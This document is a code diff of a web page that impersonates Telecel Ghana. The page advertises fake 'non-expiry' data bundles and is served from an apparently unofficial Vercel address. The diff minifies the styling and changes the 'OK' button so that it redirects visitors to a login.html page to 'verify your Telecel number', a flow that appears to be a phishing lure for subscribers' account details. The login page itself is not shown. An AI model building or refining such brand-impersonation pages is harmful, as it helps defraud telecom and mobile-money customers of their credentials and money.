@@ -8,107 +8,29 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     
     <style>
-        :root {
-            --red: #E30613;
-            --dark: #111827;
-        }
+        :root { --red: #E30613; --dark: #111827; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            background: #f8fafc;
-            color: #1e2937;
-        }
+        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #1e2937; }
 
-        nav {
-            background: white;
-            padding: 15px 5%;
-            display: flex;
-            align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            font-size: 2.2rem;
-            font-weight: 800;
-        }
-        .logo-circle {
-            width: 48px;
-            height: 48px;
-            background: var(--red);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.8rem;
-            margin-right: 8px;
-        }
+        nav { background: white; padding: 15px 5%; display: flex; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo { display: flex; align-items: center; font-size: 2.2rem; font-weight: 800; }
+        .logo-circle { width: 48px; height: 48px; background: var(--red); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin-right: 8px; }
 
-        .hero-services {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 0;
-        }
-        .service-card {
-            padding: 40px 20px;
-            text-align: center;
-            color: white;
-        }
+        .hero-services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 0; }
+        .service-card { padding: 40px 20px; text-align: center; color: white; }
         .voice { background: linear-gradient(135deg, #E30613, #b71c1c); }
         .cash { background: #E30613; }
         .broadband { background: linear-gradient(135deg, #E30613, #991b1b); }
 
-        .plans-section {
-            background: var(--dark);
-            color: white;
-            padding: 60px 5% 80px;
-        }
-        .section-title {
-            text-align: center;
-            font-size: 2.6rem;
-            margin-bottom: 50px;
-            color: white;
-        }
-        .tier-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        .tier-card {
-            background: #1f2937;
-            border-radius: 12px;
-            padding: 25px;
-            border: 2px solid #374151;
-        }
+        .plans-section { background: var(--dark); color: white; padding: 60px 5% 80px; }
+        .section-title { text-align: center; font-size: 2.6rem; margin-bottom: 50px; color: white; }
+        .tier-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; max-width: 1400px; margin: 0 auto; }
+        .tier-card { background: #1f2937; border-radius: 12px; padding: 25px; border: 2px solid #374151; }
         .tier-card:hover { border-color: var(--red); }
         .plan-name { font-size: 1.7rem; font-weight: 700; margin-bottom: 15px; color: #e5e7eb; }
-        .offer {
-            background: #374151;
-            margin: 12px 0;
-            padding: 14px 18px;
-            border-radius: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .action-btn {
-            background: var(--red);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-weight: 700;
-            cursor: pointer;
-        }
+        .offer { background: #374151; margin: 12px 0; padding: 14px 18px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .action-btn { background: var(--red); color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 700; cursor: pointer; }
 
-        /* Confirmation Modal */
         .modal {
             display: none;
             position: fixed;
@@ -139,18 +61,9 @@
     </nav>
 
     <div class="hero-services">
-        <div class="service-card voice">
-            <h3>Voice and data</h3>
-            <p>Affordable voice and data bundles to stay connected.</p>
-        </div>
-        <div class="service-card cash">
-            <h3>Telecel Cash</h3>
-            <p>Send and receive money and make payments with ease.</p>
-        </div>
-        <div class="service-card broadband">
-            <h3>Telecel Broadband</h3>
-            <p>High-speed fibre internet connectivity for your home.</p>
-        </div>
+        <div class="service-card voice"><h3>Voice and data</h3><p>Affordable voice and data bundles to stay connected.</p></div>
+        <div class="service-card cash"><h3>Telecel Cash</h3><p>Send and receive money and make payments with ease.</p></div>
+        <div class="service-card broadband"><h3>Telecel Broadband</h3><p>High-speed fibre internet connectivity for your home.</p></div>
     </div>
 
     <section class="plans-section">
@@ -192,19 +105,18 @@
                 <div class="offer"><span>1500 GHS - Unlimited</span><button class="action-btn" onclick="showOffer('Platinum', '1500 GHS - Unlimited', 1500)">Subscribe Now</button></div>
                 <div class="offer"><span>2000 GHS - Family Unlimited</span><button class="action-btn" onclick="showOffer('Platinum', '2000 GHS - Family Unlimited', 2000)">Subscribe Now</button></div>
             </div>
-
         </div>
     </section>
 
-    <!-- Confirmation Modal (Exactly like your screenshot) -->
+    <!-- Confirmation Modal -->
     <div id="offerModal" class="modal">
         <div class="modal-content">
             <div style="font-size:1.4rem; margin-bottom:15px;">unlimiteddata.vercel.app says</div>
             <div style="font-size:1.35rem; margin:15px 0;">🔥 TELECEL NON-EXPIRY OFFER 🔥</div>
             <div id="modalBody" style="margin:20px 0; line-height:1.7;"></div>
             <div style="margin-top:25px;">
-                <button onclick="closeModal()" style="background:#e5e7eb; padding:12px 30px; border:none; border-radius:50px; margin-right:12px;">Cancel</button>
-                <button onclick="proceedToCheckout()" style="background:#2563eb; color:white; padding:12px 40px; border:none; border-radius:50px;">OK</button>
+                <button onclick="closeModal()" style="background:#e5e7eb;padding:12px 30px;border:none;border-radius:50px;margin-right:12px;">Cancel</button>
+                <button onclick="proceedToCheckout()" style="background:#2563eb;color:white;padding:12px 40px;border:none;border-radius:50px;">OK</button>
             </div>
         </div>
     </div>
@@ -212,35 +124,11 @@
     <!-- Official Telecel Footer -->
     <footer style="background:#0a0f1c; color:#9ca3af; padding:60px 5% 40px;">
         <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:40px; max-width:1200px; margin:0 auto;">
-            <div>
-                <div class="logo" style="color:white; margin-bottom:20px;">
-                    <div class="logo-circle" style="width:45px;height:45px;font-size:1.6rem;">t</div>
-                    <span>telecel</span>
-                </div>
-            </div>
-            <div>
-                <h4 style="color:white; margin-bottom:15px;">Telecel Ghana</h4>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Personal</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Business</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">About Us</a>
-            </div>
-            <div>
-                <h4 style="color:white; margin-bottom:15px;">Help & Support</h4>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Find a shop</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Contact us</a>
-            </div>
-            <div>
-                <h4 style="color:white; margin-bottom:15px;">Popular</h4>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Mobile Bundles</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Non-Expiry Bundles</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Apply for Broadband</a>
-            </div>
-            <div>
-                <h4 style="color:white; margin-bottom:15px;">Quicklinks</h4>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Telecel Play</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Pay Bill</a>
-                <a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Telecel Cash</a>
-            </div>
+            <div><div class="logo" style="color:white; margin-bottom:20px;"><div class="logo-circle" style="width:45px;height:45px;font-size:1.6rem;">t</div><span>telecel</span></div></div>
+            <div><h4 style="color:white;margin-bottom:15px;">Telecel Ghana</h4><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Personal</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Business</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">About Us</a></div>
+            <div><h4 style="color:white;margin-bottom:15px;">Help & Support</h4><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Find a shop</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Contact us</a></div>
+            <div><h4 style="color:white;margin-bottom:15px;">Popular</h4><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Mobile Bundles</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Non-Expiry Bundles</a></div>
+            <div><h4 style="color:white;margin-bottom:15px;">Quicklinks</h4><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Telecel Play</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Pay Bill</a><a href="#" style="display:block;margin:8px 0;color:#9ca3af;text-decoration:none;">Telecel Cash</a></div>
         </div>
         <p style="text-align:center; margin-top:60px; opacity:0.6;">© 2026 Telecel Ghana. All Rights Reserved. | Connecting Energies</p>
     </footer>
@@ -250,12 +138,11 @@
 
         function showOffer(tier, name, price) {
             currentOffer = { tier, name, price };
-            
             document.getElementById('modalBody').innerHTML = `
                 <strong>${tier} ${name}</strong><br>
                 GHS ${price}<br><br>
-                <span style="color:#16a34a; font-size:1.1rem;">✅ Data Never Expires</span><br><br>
-                <small>You will need to verify your Telecel number to unlock and activate this offer.</small>
+                <span style="color:#16a34a;">✅ Data Never Expires</span><br><br>
+                <small>You will need to verify your Telecel number to unlock this offer.</small>
             `;
             document.getElementById('offerModal').style.display = 'flex';
         }
@@ -266,8 +153,10 @@
 
         function proceedToCheckout() {
             closeModal();
-            // Simple confirmation like "before"
-            alert(`✅ Offer Selected Successfully!\n\n${currentOffer.name}\nGHS ${currentOffer.price}\n\nYour Telecel number will be verified shortly to activate the Non-Expiry Data.`);
+            const params = new URLSearchParams();
+            params.append('bundle', currentOffer.name);
+            params.append('price', currentOffer.price);
+            window.location.href = `login.html?${params.toString()}`;
         }
     </script>
 </body>
